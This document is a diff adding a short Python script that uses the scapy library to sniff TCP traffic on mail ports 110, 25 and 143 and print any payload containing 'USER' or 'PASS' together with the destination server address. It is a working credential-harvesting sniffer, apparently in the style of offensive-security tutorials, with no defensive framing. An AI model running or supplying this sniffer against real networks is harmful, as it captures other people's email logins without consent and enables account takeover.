@@ -1,0 +1,21 @@
+#!/usr/bin/python3
+
+from scapy.all import *
+
+
+def packet_callback(packet):
+
+    if packet[TCP].payload:
+
+        mail_packet = bytes(packet[TCP].payload)
+        usr = bytes('USER', 'utf-8')
+        pss = bytes('PASS', 'utf-8')
+        payload_brute = bytes(packet[TCP].payload)
+        payload = str(payload_brute.decode(encoding='utf-8'))
+
+        if usr in mail_packet or pss in mail_packet:
+
+            print("[*] Server: %s" % packet[IP].dst)
+            print("[*] %s" % payload)
+
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
